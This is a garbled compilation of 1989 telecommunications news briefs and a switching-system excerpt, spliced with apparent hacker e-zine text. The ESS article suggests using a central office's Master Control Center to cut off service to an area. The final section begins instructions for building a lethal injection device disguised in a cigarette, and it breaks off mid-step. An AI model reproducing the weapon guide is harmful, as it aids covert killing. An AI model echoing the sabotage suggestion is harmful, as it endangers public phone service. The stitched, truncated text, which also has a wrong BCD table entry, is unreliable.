adjuncts to existing SPC switches.  Fourth-generation switches thus provide

advanced capabilities without the necessity of replacing or retrofitting

the existing switches.  Some features that can be provided as adjuncts

are described in the following paragraphs.



  Special Services:  In the U.S., services that require more sophisticated

transmission that provided by standard telephone lines are expanding rapidly.

By the end of the 1980s, 50 percent of all lines may require some special

treatment.  A USDN switch, or a special service adjunct can provide univer-

sal line circuits that can be remotely administered for transmission

balance, type of transmission, routing, and signaling.  The special service

adjunct can provide various voice and data arrangements and automatic

facilities testing as well as provide and maintain sophisticated data and

voice services, often without changing the user's original telephone number.



  Business Services:  Integrated toll, local, Centrex, PBX, and instrument/

terminal systems are not provided in the U.S. because of its regulatory

climate.  Regulations controlling enhanced services, authority to provide

services, equal-access provisions, and franchising of special carriers and

servers all affect the USDN but are constraints in the ISDN plans.  Because

of the uncertainty and ambiguity in such regulatory matters, the business

services adjunct can be used with less economic risk than replacing or

retrofitting existing switching systems would incur.  The business services

adjunct permits the existing local office to continue providing the local

telephone service for which it was optimized.  The business services

adjunct can also economically provide such features as:

    *  Citywide, Centrex-like service with universal numbering among user

       locations.

    *  Centralized attendants and night service

    *  Direct data lines at 64K bits per second

    *  Rerouting of existing PBX trunks with improvement in features

    *  Lan termination for PBX-to-Lan connections and LAN-to-LAN bridging.

SATELLITE USE WILL KEEP SOARING:



   Satellites and fiber-optic cables will be used for

international communications well into the 21st century, according

to a Communications Satellite Corp. study. The study suggests that

services using satellite systems could be up to 45% less expensive

than international transmissions that use fiber. Also giving

satellites staying power: Ability to reach remote areas.



RCI SENDS CALLS OVER THE WATER:

   RCI Long Distance, a subsidiary of Rochester Telephone, said

Thursday that it has added 122 countries to its international

service, including popular calling areas such as West Germany and

Israel. Rates: RCI says only that the service will be priced

competitively with other carriers offering international services.



PROGRAM PUTS NETWORK ON THE MAP:

   A computer program from Connections Telecommunications can be

used by network designers to create a visual map of their

wide-area network, reports Computerworld magazine. The program,

called Mapconnect, will superimpose over a map of the USA the

serving office, hubbing point and area sites with their

connections. Cost: $2,000 per copy, plus $400 annual maintenance

after the first year.



CALIFORNIA, MORE FIRMS COMPETE:

   Competition for local access and transport area data

transmissions to long distance carriers has been strengthened in

California by a recent PUC decision. The commission approved a

deregulation plan that will likely have MCI, US Sprint and Cable

and Wireless Management Services competing with Pacific Bell and

GTE California, says CommunicationsWeek.



VERMONT TO UPGRADE TELE SYSTEM:

   The State of Vermont will be getting technical support for

improvements in its telecommunications network from Federal

Engineering Inc., according to CommunicationsWeek. Contract value:

Not revealed. Federal Engineering has provided similar service in

Montana, New Mexico, North Dakota, Virginia and Wyoming.



CAMPUS GETS BIG DOSE OF HI-TECH:

   Southwestern Bell is putting more than 40 miles of high-speed

fiber optics into the St. Louis Community College system, reports

CommunicationsWeek. The network will link the school's 3 campuses

and headquarters to provide video, voice and data transmissions

for educational programs. Cost to the school: $580,000, plus

$2,000 per month to use the system.



SOMEONE MIGHT BE LISTENING:

   About 30 hours worth of recorded audio-visual material was

recorded by New York City residents recently for transmission into

outer space, reports InfoText magazine. AT&T set up the free

service at its headquarters. Messages were beamed into space on

the company's satellite dishes. Among the messages: A young

student reported on a pro basketball game for any interested

"aliens."



-------------------------------------------------------------------------------

Feb. 20, 1989

AT&T PLANS OVERHAUL:

   AT&T announced a sweeping overhaul Friday designed to make the

long-distance company more competitive and profitable. AT&T will

split its 5 business groups into 12 units to 25 units that each

will have sole responsibility for a product or service. The idea

will be phased in over a period of months this year. (For more,

see special AT&T package below. From the USA TODAY Money section.)



JAPAN SET FOR JUNGLE LAUNCH:

   The first of 2 satellites for the Japan Communications

Satellite Co. lifts off Feb. 28 from a jungle launch pad in French

Guiana. The launch will inaugurate commercial satellite

communications in Japan and be the first of Hughes Communications'

new HS 393 series. The satellite will begin serving the Japanese

islands, including Okinawa, after a 30- to 60-day testing period.



SATELLITE HAS MANY CUSTOMERS:

   The JCSAT 1 satellite going into orbit on Feb. 28 will provide

the Japanese islands with various new services. Scheduled to come

off the satellite: Network and cable TV distribution, used-car

auctions, prep school classes, religious programming, automobile

dealer training, a specialized engineering video network. Also: A

business group plans to offer business communications.



BIG SATELLITE WON'T BE THE LAST:

   With a deployed height of 10 meters, the Hughes Communications'

satellite being launched by Japan next week will be the largest

Hughes commercial satellite ever launched. It contains 32

transponders, each one capable of transmitting one TV channel, 45

million bits of data per second, or more than 250 telephone

circuits. Japan will launch a second satellite this summer.



SPACE STATION MAKES AUDIO PLANS:

   NASA has chosen Harris Corp. audio communications systems for

use on the space station Freedom, scheduled for operations in

1995. CommunicationsWeek says that under a $35 million subcontract

with Boeing Aerospace, Harris will design, develop and produce

systems for onboard use. Special feature: At times when crew

members have their hands busy, a voice recognition capability will

be available.



CHINA SPRINTS FOR THE MICROWAVE:

   About 90% of its surplus microwave network has been sold or

dismantled by US Sprint, according to CommunicationsWeek. The old

equipment is being replaced by a fiber network. Most recently, the

People's Republic of China spent about $15 million for 6,000 used

analog microwave radios and 600 parabolic antennas. China plans to

use the equipment on 11 existing microwave networks.



NYNEX BEGINS ANOTHER TEST:

   Nynex is providing a digital data-over-voice private-line

access service for Telenet Communications in a New York City field

trial. It is one of 35 basic service elements Nynex specified in

its Open Network Architecture plan for the FCC, reports

CommunicationsWeek. Nynex expects to present 14 other new

offerings before the end of the year.



BOSSES GET MORE RESPONSIBILITY:

   The reorganization plan announced by AT&T Friday is the first

major policy move by Robert E. Allen since he took over last April

as chairman. The goal: Get managers to focus more on customers and

on costs by giving them total responsibility for any money they

make or lose. Right now most of that responsibility is held by top

managers at AT&T.



AT&T HOPES FOR BIGGER SALES:

   The AT&T move to split its business groups comes at an

opportune time. AT&T is losing market share in the long-distance

phone market to rivals MCI and US Sprint. Also: AT&T's overall

sales growth has been modest over the last several years. Under

the new plan, the presidents of AT&T's 5 operating groups will be

renamed group executives. The new units will operate as

independent businesses.



NEW APPROACH MIGHT START SLOWLY:

   Analysts say it will take years to streamline AT&T's

bureaucracy and get managers accustomed to being directly

accountable for the performance of their businesses. AT&T reported

a loss of $1.67 billion on sales of $35.21 billion in 1988.

Earnings were reduced by a net charge of $3.94 billion from

writing off old equipment and accelerating modernization of its

long-distance network.



-------------------------------------------------------------------------------

Feb. 21, 1989

DATA CROSSES MILES WITH SPEED:

   Northern Telecom yesterday announced the availability of the

High Speed Data Module, a data connectivity device that is an

addition to the Meridian SL-1 Data Services product line. A

typical application might involve a bank that uses the module to

connect a programming facility with the bank's main data center,

located approximately 400 miles away. Cost: $725.



INMATES TOUCH, SAVE AND LOSE:

   Some 15 inmates from local prisons in the Nashville, Tenn.,

area face computer fraud charges after figuring out Touch & Save

long-distance phone customers' user codes. Officials say the

inmates charged more than $2,000 in calls. The inmates gained

access to the codes and sold them for $5 or more to others in the

prison. (From the USA TODAY News section.)



PRODUCTS WILL PROTECT DATA:

   CompuServe Inc. has introduced new encryption products for its

public packet data network, Network World reports. The encryption

services let users move data from expensive leased lines to

cost-effective dial-up public circuits, while protecting the data

from unauthorized access. The cost ranges from $1,495 to $8,100.



PROTEON UNVEILS FIBER MODEM:

   Proteon Inc. has developed a single-mode, fiber-optic modem

that will extend the distance between 2 nodes on a token-ring

network, says Network World. The p3282 modem permits 2 nodes to

communicate over a maximum distance of 30 kilometers without using

a repeater. The fiber also uses optical laser technology instead

of LEDs for transmission of the signal. Cost: $10,000.



NETWORK CHARGES ARE DROPPED:

   Transettlements Inc. has stopped making additional charges for

internetwork transmission, reports Computerworld magazine. The

firm will no longer charge its users fees, penalties or premiums

for interconnection with other value-added networks. The charge

for going through 2 networks will be the same for going through

only Transettlement's network.



AIRLINES, HOTELS JOIN NETWORK:

   GEnie, a consumer online information service from GE

Information Services, is now offering the Official Airline Guide

Electronic Edition Travel Service. The edition will permit GEnie

subscribers to view airline schedules, fares and hotel

information. Cost: A surcharge on GEnie of 17 cents/minute during

non-prime hours and a surcharge of 47 cents/minute during prime

time.



RESERVATIONS ARE A TOUCH AWAY:

   Harrah's Reno introduced a guest service center at the Reno

Airport yesterday that uses interactive, live video to streamline

guest reservations. Guests can check into Harrah's, make dinner

reservations and arrange to see a show by touching a TV screen.

The system uses Nevada Bell's new ISDN network that allows voice,

data and video communications to use fiber optic wires

simultaneously.



-------------------------------------------------------------------------------

Feb. 22, 1989

PHONE USERS DO IT THEMSELVES:

   US West's 35,000 Bellingham, Wash., customers will test the

first of what could be a major telephone innovation:

Instantaneous, do-it-yourself phone service. In the plan, a person

could shut off service, have a 3-way holiday conversation and have

calls sent to work - all by dialing a series of numbers. (For

more, see special Phones package below.)



SATELLITE TO SERVE INDONESIA:

   Scientific-Atlanta has been selected to supply a half dozen

major communication systems in the Pacific Rim: A VSAT satellite

link for Indonesia and 5 private television networks for Japanese

firms. The satellite network will provide interactive data, video

and voice communications to as many as 4,000 sites on the 13,677

islands that make up the Republic of Indonesia.



NETWORKS TO GO ON NEW SATELLITE:

   Nippon Telephone & Telegraph Co. of Tokyo and 4 other Japanese

companies said yesterday they will use Scientific-Atlanta's B-MAC

satellite technology to establish 5 private business television

networks in Japan. When their private television networks are

completed, Nippon, Nikken, Telecom Sat and Video Sat plan to send

video signals to JC-Sat, Japan's new communications satellite.



TELCO ENTRY IS UNPREDICTABLE:

   Congress will probably not address the issue of telephone

companies entering the TV business in the near future, National

Assn. of Broadcasters President Eddie Fritts tells Broadcasting

magazine. He says the telco entry will be one of the top issues of

the 1990s. But he stops short of making predictions, saying only

that free over-the-air broadcasting will survive.



MORE STATIONS PICK UP SATELLITE:

   Satellite-delivered talk-radio programs are growing as AM

station directors look more closely at the potential of

low-maintenance, national talk shows. Broadcasting magazine says

the 3 month-old American Radio Networks joined the field with 22

affiliates and now has 110 stations receiving its 24-hour

satellite service.



SATELLITES FLY FOR GERMAN TV:

   Highly competitive satellite and cable TV services are expected

to grow significantly during the next 2 years in West Germany,

according to Broadcasting magazine. West German private TV channel

RTL Plus, a satellite-to-cable service, is expected to expand its

market to 10 million viewers. U.S. firm Capital Cities/ABC has a

holding in Tele-Munchen, part owner of the Tele5 satellite

channel.



 SPECIAL PACKAGE ON PHONES:

 -------------------------

SERVICE COULD START IN A SNAP:

   Customers moving into new homes could start phone service

within minutes by dialing telephone responses to a series of

computer-voiced questions with a new service being tested by US

West Communications. Officials liken the change to the switch from

operator-assisted to direct-dial local calls in the 1920s or the

similar change in long-distance calls in the 1950s.



SERVICE COULD LINE THE WEST:

   If an upcoming test of do-it-yourself phone service works in

Bellingham, Wash., another 2-year test will be done on the same

service in a larger market, such as Denver. If that also goes

well, the entire US West market - 14 states - will get the new

system by the year 2000. Throughout the test, all customers still

will be able to use their telephones as they now do.



FEATURES ARE A BUTTON AWAY:

   US West customers with do-it-yourself service will be able to

start or stop telephone feature services at any time, including

such commonly used services as call forwarding and 3-telephone

conversations. These services already are available, but only by

calling US West sales representatives during daytime business

hours. The new system will allow changes to be made at any time.



-------------------------------------------------------------------------------

Feb. 24-26, 1989

CELLULAR SIGNAL GOES FARTHER:

   Pacific Telesis has installed antennas at both ends of an

Oakland, Calif.-area tunnel to carry signals from cellular car

telephones, reports Forbes magazine. Also: PacTel is using a solar

cell to power a repeater signal and extend coverage into Laguna

Canyon. Forbes says the developments are indications of coming

improvements in cellular transmissions.



THE AIRWAVES ARE CROWDED:

   The main problem for cellular phone users in large metropolitan

areas is the addition of new subscribers to already jammed

cellular systems, reports Forbes magazine. The FCC has allocated

only 437 channels of radio waves to each carrier. To add

customers, systems have been subdividing cells, with each cell

having low-power antennas that operate in limited boundaries.



SENDING COSTS WOULD BE HALVED:

   Digital cellular technology could solve the problem of cramped

airwaves for cellular telephone systems, reports Forbes magazine.

With digital, ordinary radio interference is eliminated,

conversations are private, data from laptop computers can be sent

to the office from the road. Also: Digital cellular would cost

about half the transmission price because it's twice as fast.



LOYOLA PLANS FOR ISDN USE:

   AT&T recently said that the Definity 75/85 communications

system will be the base for an Integrated Services Digital Network

that will carry voice, data and images for Loyola University.

Computerworld says Loyola is expected to be the first commercial

customer to use Definity. By early next year about 7,000 phones on

the 3 Chicago-area campuses will be on the system.



TELENET LINKS WITH STRATACOM:

   Telenet Communications has made an agreement with Stratacom

Inc. to develop the technology for what the companies said will be

the first broadband Integrated Services Digital Network service to

be based on the ISDN frame relay interface, reports Computerworld.

Telenet, a subsidiary of U.S. Sprint, will integrate packet

switches with Stratacom digital multiplexers.



THE PHONE IS IN THE BANK:

   Banks are playing it smart with their money and are winning

price concessions from telephone companies by pitting carriers

against one another, reports Network World. Some banks are

negotiating for new services; others are cutting costs by striking

custom contracts with local carriers. Example: Irving Trust of New

York used MCI and AT&T to get a new international calling service.



CIA HELP IS NO SECRET:

   The CIA linked its electronic-mail systems together with the

help of Soft-Switch, a company in Wayne, Pa., that specializes in

connecting multivendor E-mail systems, reports Government Computer

News. A key function of the software package: Directory services

that maintain information on all mail systems directly or

indirectly connected to the software.



FCC GETS COMPLAINT ON PACBELL:

   Conference-Call USA, based in Chicago, has filed a complaint

with the FCC, accusing Pacific Bell of refusing to change its

practice of automatically routing all conference-call traffic to

AT&T, reports CommunicationsWeek. The firm says the practice is

stunting the growth of competitive companies.



STUDENTS ARE ON THE PHONE:

   School children in Denver are using computers and transmission

facilities from US West Advanced Technologies to communicate with

teachers, special subject experts and other students.

CommunicationsWeek says the equipment will be given to the school

system at the end of the school year. US West is using information

gained from the trial to plan an information gateway in Omaha,

Neb.



HEARING IMPAIRED CAN MAKE CALLS:

   The State Relay Center is scheduled to begin service Friday in

Birmingham, Ala. The new relay center was created to link

hearing-impaired customers by teletype to people they want to

call. The service is funded by a small surcharge on all phone

bills in the state.



-------------------------------------------------------------------------------

Feb. 28, 1989

CALLERS MUST BE TOLD THE COST:

   The FCC yesterday ordered 5 companies that charge customers 20%

to 80% more than AT&T, MCI or Sprint to toe the line. The

alternative operators must now tell callers how much the call will

cost and which company is placing it before it goes through. The

high rates usually are placed on hotel, airport or hospital

phones. (From the USA TODAY News section.)



FIRMS GIVE A PART OF REVENUES:

   The phone companies told by the FCC yesterday to reveal costs:

Central Corp., International Telecharge Inc., National Telephone

Services Inc., Payline Systems Inc. and Telesphere Network Inc.

Right now all these companies buy phone time from a major carrier

such as AT&T and MCI and then give the hotel, airport or hospital

that uses the service a cut of revenues from every call.



CALLERS WILL GET MORE RIGHTS:

   The FCC said yesterday that alternative long-distance operators

must: Put a sticker on the phone with price information or tell

the caller the price verbally; give callers an chance to hang up

without any charge; offer callers a chance to go through AT&T or

another phone service. Right now many alternative operators stop

you from using another carrier.



NISSEI PLANS A FAX EXPANSION:

   Portable facsimile machine manufacturer Nissei says that a

major expansion of its operations will be completed within 2

months. To come: As many as 5 new fax machines, a revamping of the

field staff to cover all sales territories. Also: Vice President

John Haggerty says Nissei will move into other areas of the retail

information technology market.



BELL GOES TO COLLEGE:

   Bell Atlanticom Systems said yesterday it has signed a contract

with the College of William and Mary in Williamsburg, Va., for a

fully integrated voice and data communications system. The

campus-wide system will provide resale of communications services

to students, a management system, and a universal wiring plan to

provide voice and data transmission.



SYSTEM INCLUDES TRUNKS, LINES:

   The communications system obtained by the College of William

and Mary yesterday will provide 300 trunks, 3,800 faculty and

student lines, 150 voice/data faculty users and 1,050 host data

ports. It includes more than 5,000 inside wiring runs and several

miles of fiber optics. Also included: A 1,000-user Aspen Voice

Mail System and the Alex-IS Telecommunications Management System.



MESSAGES GO AROUND THE GLOBE:

   GE Information Services has announced a new capability of its

QUIK-COMM System (electronic mailbox service) which enables users

to send QUIK-COMM messages to facsimile machines throughout the

world. Receiving fax machines must be Group III facsimile

terminals that conform to CCITT standards. Recipients do not have

to be QUIK-COMM System subscribers to receive the fax document.



MCI GETS THE INSURANCE:

   Northwestern Mutual Life Insurance Co. said yesterday it has

selected MCI Communications to replace AT&T's data network with a

nationwide data communications network linking Northwestern

Mutual's Milwaukee-based home office with its remote general and

district agency offices. The 3-year, multimillion dollar agreement

will eventually link more than 200 agency offices.



BELLSOUTH GETS CLOSER TO EUROPE:

   BellSouth Corp. has signed a definitive agreement to purchase

Air Call Holdings' shares in Air Call Communications, providers of

cellular, paging and telephone answering and telemarketing

services in the United Kingdom, Ireland and continental Europe.

BellSouth provides mobile systems services in the USA, Argentina,

March 3-5, 1989

PHONE LINES ARE SIMILAR:

   The USA's major long distance phone services aren't that

different. A comparison of AT&T, MCI Communications Co. and Sprint

Communications Co. in the March Data Communications magazine

found, for instance: Calls placed over Sprint lines were slightly

louder than those placed over AT&T or MCI lines. All the calls,

however, could be heard clearly. (From the USA TODAY Money

section.)



SPRINT WAS MOST ACCURATE:

   A study by Data Communications magazine says AT&T connected its

calls more quickly than other carriers. On average, it took 9.8

seconds to connect an AT&T call; 12.9 seconds for Sprint; 13.7

seconds for MCI. Also: Sprint had the fewest foulups. Only 2.3% of

the calls on its lines failed to go through on the first try; 4.9%

for AT&T; and 7.3% for MCI.



CRITICAL FIRMS CALL SURVEY FAIR:

   When information was sent from one computer to another over

phone lines during a study by Data Communications magazine, AT&T

had the fewest glitches. Next best: Sprint, then MCI. The magazine

placed 150-180 calls over the trio's phone lines between 4 cities

last fall. Companies response: All had criticisms of the

comparison but, overall, said results appeared to be fair.



PHONE FIRM ELIMINATES CHEMICAL:

   AT&T says it's saving the ozone layer. The company says it has

developed a way to eliminate the chemical CFC-113 from a process

it uses to make electronic circuit boards. Scientists say the

chemical may damage the ozone layer of the earth's atmosphere,

which protects people from dangerous ultraviolet rays from the

sun. (From the USA TODAY Money section.)



SERVICE STOPPED IN CANADA:

   Bell Canada has decided to end its 976 phone service in all of

its service regions, Telecommunications magazine says. The firm

said significant increases in cost and an anticipated decline in

revenues as primary factors in making the decision. Bell Canada is

the nation's largest telecommunications operating company.



MCI FAX HAS SEVERAL FEATURES:

   MCI has moved fast on fax. Telecommunications magazine reports

that MCI has become the first long-distance company in the USA to

offer a dedicated network for domestic and international fax

transmissions. Called MCI FAX, the service will include management

information reports, customized dialing plans, credit card billing

and other features.



-------------------------------------------------------------------------------

March 8, 1989

PACBELL TRUNK FEES SHOOT HIGHER:

   Costs on Pacific Bell's Assured PBX Trunk Line Service have

jumped nearly 50%, according to Network World. The increase was

made after the California Public Utilities Commission approved a

PacBell plan to create a new trunk service and raise rates for

what was once the only grade of service available. One firm with

2,000 trunks will pay about $96,000 more per year.



BELL PUTS FIBER INTO LAUNCH:

   Southern Bell and Bell Communications Research engineers are

working with NASA to prepare for a high definition TV taping and

transmission of the launch of the space shuttle Discovery.

Broadcasting magazine says Southern Bell and Bellcore are handling

a live fiber-optic transmission of the launch. A temporary studio

has been built at Kennedy Space Center.



RATES WILL DROP IN ALABAMA:

   The Alabama State Public Service Commission said in Montgomery

yesterday that phone rates will soon drop in the state. Ordered:

South Central Bell must reduce rates by $9 million by April. Cuts:

25 cents off the monthly Touch-Tone service; the elimination of

the Touch-Tone installation fee.



SATELLITE FLIES FOR JAPAN:

   The next launch of Arianespace is scheduled for the end of

March. Using the ELA 1 launch complex, an Ariane 2 launch vehicle

will place into orbit the Swedish direct broadcasting and

communications satellite TELE-X. The group last Saturday launched

the first Japanese telecommunications satellite JCSAT 1 and the

first European meteorological satellite MOP 1.



OPTIONS ADDED TO VOICE LINE:

   VoiceCom Systems has added 3 new service options to its voice

messaging product line, extended its worldwide communications

network, and created a new business unit to develop and implement

custom voice response applications. VoiceCom also introduced Guest

Mailbox service, which allows VoiceCom customers to temporarily

assign special voice mailboxes to their customers and vendors.



MODEMS ARE SLEEK, SOPHISTICATED:

   Some modems are being marketed like sleek sports cars. General

DataComm Industries is touting 2 new leased-line modems for

9,600-bit-per-second data communications as "the perfect balance

of technology and style," CommunicationsWeek says. Also: The

company says they include "sophisticated features" in "small,

stylish enclosures."



RADIO TELESCOPES LOOK IN SPACE:

   112-foot-diameter and 210-foot-diameter radio telescopes in

NASA's Deep Space Network will be used in the search for

extraterrestrial intelligence in space. Located in the Mojave

Desert and Australia, the telescopes will survey the universe over

a wide radio frequency range and spot-check bands up to 25,000

megahertz for some signal that indicates intelligence.



RADIO WILL SEARCH SILENT VALLEY:

   NASA's radio network searching for intelligence in space will

cover at least 10,000 times more frequencies than all previous

surveys and be 300 times more sensitive. The search will hunt for

signals from stars similar to Earth's sun, up to 80 light years

from Earth. Of particular interest: The region from about 1,000

megahertz to 60,000 megahertz, the silent valley of frequencies.



PHONE WILL KEEP HER IN TOUCH:

   A telephone and computer electronic mail service will keep

Abigale K. Alling in touch with the world when she begins a 5-day

experiment today in the Arizona desert. She will enter a

20-foot-high, 23-foot-square test module through an air lock and

sever the umbilical cord with Earth. She will be cut off from

everything except sunlight and communication links with the

outside world.



-------------------------------------------------------------------------------

March 9, 1989

AT&T MAKES LINK, CHIP FOR JAPAN:

   AT&T announced 2 products yesterday for Japan: A high-speed,

fiber optic data link and an Integrated Services Digital Network

(ISDN) microchip. The microchip can work with a variety of

microprocessors and other ISDN chips. It will more easily allow

Japanese telephone users to have access to a digital network that

can provide data, voice, and image transmission on one phone line.



LINK WILL HAVE LAN, VIDEO USES:

   AT&T is developing the ODL 125-FC Lightwave Data Link to comply

with Japan's industry standard for fiber-optic connectors, AT&T

HUGHES OBTAINING NETWORK FIRM:

   Sytek Inc., a producer of local network equipment, is being

bought by Hughes Aircraft for an estimated $50 million, Network

World reports. The deal still needs SEC approval. Sytek products

include broadband, fiber-optic and twisted-pair versions of

Ethernet and token-ring networks. The acquisition has been

discussed for months.



TULSA METROLINK TO BE BOUGHT:

   Dallas-based Columbine Telenet has entered an agreement to

purchase Tulsa MetroLink from Public Service Co. of Oklahoma,

officials said yesterday. Tulsa MetroLink is a 110 mile digital

fiber optic communications system founded in 1984 by PSO to

provide for high speed data and voice transmission to meet

internal communications needs.



TULSA FIRM HAS LONGEST FIBER:

   Tulsa Metrolink, which is being purchased by Columbine Telenet,

includes the longest single span of fiber in the USA - 1,944 feet

across the Arkansas River. The network can carry more than 400

million bits of data each second and can handle 6,000 simultaneous

voice conversations. Laser beams translate data or voice signals

into on-off lights sent through glass fibers finer than human

hair.



CXR LINE TO CROSS INTO KOREA:

   CXR Telcom, worldwide supplier of systems for the

communications markets, has signed a 3-year licensing agreement

with Woojin Electronics and Telecommunications Ltd., of Seoul,

South Korea. Under the agreement, subject to Korean government

March 10-12, 1989

SPRINT SIGNS ATLANTIC DEAL:

   Cable & Wireless and US Sprint Thursday announced that US

Sprint will acquire the USA end of the PTAT transatlantic

fiber-optic cable system. Also: The 2 companies have formed an

alliance to jointly develop advanced global telecommunication

services. PTAT is the first privately built transatlantic

fiber-optic cable. It will link the USA and Britain. (From the USA

TODAY Money section.)



SPRINT GETS HALF INTEREST:

   The alliance between US Sprint and Cable & Wireless will be

named GLOBAL FON. Also: US Sprint has agreed to acquire the

complete interest of the Washington-based Private Transatlantic

Telecommunications Systems in the PTAT transatlantic cable system.

The acquisition, which is subject to FCC approval, will give US

Sprint a 50% interest in PTAT along with Cable and Wireless.



NEW SERVICE OFFERS IVPN:

    Among the first services to be jointly developed by GLOBAL FON

by Cable & Wireless and US Sprint will be an international virtual

private network (IVPN) based on Sprint's VPN and a GLOBAL FONCARD

based on Sprint's travel service, the FONCARD. The alliance will

also develop international private line services offering

customers a variety of enhanced features and capabilities.



ARTEL SYSTEM TO SELL IN JAPAN:

   NKK Corp., one of Japan's largest industrial concerns with

annual revenues of $8 billion, will be licensed to manufacture and

sell Artel Communication's 100 Mbps fiber optic local area network

system, FiberWay, in Japan, the companies said Thursday. Also: NKK

becomes the authorized distributor for Artel's fiber optic video

and graphics transmission system products.



FLORIDA SITE PLUGGED INTO FIBER:

   The latest development in fiber optic technology is bringing

fiber to the home, Southern Bell says. Heathrow, a mixed use

development north of Orlando, Fla., is on the leading edge of

fiber-to-the-home efforts. At Heathrow, residents will receive

voice, data and video over the same fiber system. The system

points to the day when optical fiber will be possible over all

telephones.



AREA SET FOR VOICE-ONLY FIBER:

   The first widespread appearance of optical fiber to the home

will be traditional voice lines, Southern Bell says. The company

will begin using fiber for voice-only delivery later this year in

Governor's Island, north of Charlotte, N.C., and several other

locations. Studies show that fiber systems to carry voice to the

home will be more economical than copper by the early 1990s.



FIBER IS GOING SINGLE-MODE:

   Southern Bell uses fiber systems that operate at up to 1.2

billion digital bits a second on a single fiber (the equivalent of

more than 16,000 simultaneous voice conversations), the firm says.

Since 1985, most of the optical fiber placed in Southern Bell has

been single-mode, which has a thinner core than its multi-mode

counterpart, keeping lightwaves traveling in a straight path.



CHEVRON CHOOSES TELECOM SUPPLIER:

   Chevron Information Technology Co. (CITC) has selected Northern

Telecom as its sole supplier of telecommunications equipment,

company officials said Thursday. The $8.4 million dollar agreement

During the restoration, the International Telecommunications

Satellite Organization carries the international traffic. TAT-8 is

owned by AT&T, France Telecom and British Telecom.



NYNEX SUPPORTS HIGH-SPEED DATA:

   NYNEX said Thursday that it supports proposed generic

requirements for a new high-speed data communications service.

Known as Switched Multimegabit Data Service, the system is

scheduled to be available as early as 1991. SMDS will interconnect

local area networks (LANs) by providing broadband transport across

a metropolitan area using public, packet-switched networks.



SYSTEM HAS POTENTIAL:

   Designed to make use of evolving metropolitan-area network

standards and technology, the new Switched Multimegabit Data

Service will provide customer voice commands or touchtone signals.



 When a user calls the TeleCenter, he or she is prompted to give a name and

password.  A voice entry feature searches its "user profile" records for a

voice pattern matching that of the caller.

The first issue of Cybertek Magazine(hardcopy) was just published some weeks 
ago. We reviewed it, and thought it was fantastic. We rate it as a magazine
with exceptional qualities and obviously with high potentials. The new magazine
covers various aspects of telephony, radio, chemistry, security and survival. 
We would like to point out that this is not solely a 'hacking magazine' however
various aspects are covered.

        The Master Control Center is undoubtably the very essence of ESS.  The
Master Control Center (MCC) is the operational, maintenance, and administrative
core of the electronic switching central office.  This unit is what the ESS
operators use to control the ESS switch.  It test's customer lines and trunks,
alarms to indicate malfunctions, perfroms system testing functions, controls
operations, contains the magnetic tapes for recording Automatic Message
Accounting (AMA) data, and contains various other specialized equipment.


Primary Components of the MCC
-----------------------------

Master Control Console
Trunk and Line Test Facilities
Teletype (Teletypewriter) Channels 
AMA Recorders
DATASPEED -40 Terminal with Display and Printer

        As you can see the MCC panel is divided up into five main groups of
keys and lighted or LED displays;  processor display, update, override control,
system reinitialization, and processor configuration sequencer.  The update
group of keys and displays permits personnel to check when a program update is
in progress.  The override group of switchs and displays allows personnel to
manually activate a central control unit, auxillary bus unit, and program store
buse for emergency system recovery.  The system reinitialization keys and
displays allow personnel to manually reinitialize the system in conjuction with
the override control or processor configuration sequencer group of keys.  

Workings of the MCC and Points of Interest
------------------------------------------
        
        Now that you have a little background information on the MCC, and are
familiar with the MCC Console we can talk about the MCC a little more.  The MCC
can be used to remove from service all outgoing trunks, customer lines, and
service circuits.  This would be an interesting project next time your at your
local CO to stop all service to an area.  The MCC is capable of flagging
pernament signals i.e. busy signal (black box on electromechanical or crossbar
offices) .  The master testing circuit can be connected to any outgoing trunk,
service circuit, and most often any customers lines for testing purposes.  Also
the MCC can be connected to any voltmeter to test any customers line, service
circuit, or outgoing trunk.  The MCC also interacts with Remote Switching
Systems to perform various testing functions to detect bad circuits and
potential future problems i.e. a decaying circuit or two.  

AMA in the MCC
--------------

        The Automatic Message Accounting recorder is located on the MCC and
stores "customer billing information <right>" on magnetic tapes.  One 2,400 ft
reel of tape stores the billing data for 100,000 calls a day.  These tapes
however are backed up by duplicates to ensure against failure or billing error
although it does happen, and the two copies are sent to a DPC (Data Processing
Center) for analysis in computing customer bills   The data that is to be
stored is selected by the call processing program, which deceides whether or
not the information for a call is to be stored.  Then the data is temporarily
stored in the AMA register (full capacity of the AMA register is 230 bits each)
call store, and after completion of the call the related data is assembled in
the BCD (Binary Coded Decimal (see Binary Number System for Decimal Digits
Diagram)) format and placed in the AMA buffer call store.

Binary Number System for Decimal Digits
---------------------------------------

Decimal    Four Digit Binary Code
Number       A     B     C     D
            <8>   <4>   <2>   <1>
-----------------------------------------
  0          0     0     0     0
  1          0     0     0     1
  2          0     0     1     0
  3          0     0     1     1
  4          0     1     0     0 
  5          0     1     0     0 
  6          0     1     1     0
  7          0     1     1     1
  8          1     0     0     0
  9          1     0     0     1
  10         1     0     1     0 
  11         1     0     1     1 
  12         1     1     0     0 
  13         1     1     0     1 
  14         1     1     1     0
  15         1     1     1     1

        The recording procedure is then started by an AMA program in program
store when the AMA buffer in call store is fully loaded.  The AMA buffer has a
full capacity of 140 words of 23 bits each.  The AMA program will cause central
control to direct that the data be transferred one word at a time to the AMA
circuit for recording on the tape.

Suggested Reading
-----------------

Basic Carrier Telephony, Third Edition by David Talley
Basic Telephone Switching Systems, Second Edition by David Talley

Anything Else by David Talley he wrote a few more.  He is one of the best
telecommunications authors, and all of this information was born into me
through him.  His books are also written with quesitons in the back which helps
you to learn the information.  Next time some moron throws an infoform at you
asking what ESS is you can quite simply say something rude like, "Are you
talking about the program interruptions in a No.1A ESS office which occur every
1.4 microseconds due to the system clock providing of course that it is running
off of a 1A processor and hasn't been modified in any way, and is running stock
software?"  That outta get em eh?

        This is a series solely written from pure genius.  You will not find
the methods outlined here in any book or any other publication.  They are for
informational purposes only, and are not to be used.  The method I will outline
here will consist of two parts.  The first part is the construction of a lethal
injection device.  The second part will discuss how to turn this device into a
totally harmless looking device that kills quickly, silently, and effectively.

Construction of a Lethal Injection Device 
------------------------------------------

Materials Needed
----------------

Deadly Toxin i.e. air, cyanide, etc... (no specifics are outlined)
Larger syringe if superimpostition is needed.
5 cc or less size syringe with a 3/4 inch needle if unavailable superimpose.
a syringe that's body fits loosely in an emptied cigarette.
Superglue if superimposition is needed.
Cigarette Pack 100's preferably

Preparing the Syringe
---------------------

1) Totally disassemble the syring you will be working with the two parts.
    mainly

2) Skip if needle is 3/4's of an inch.  Break the needle off of the larger 
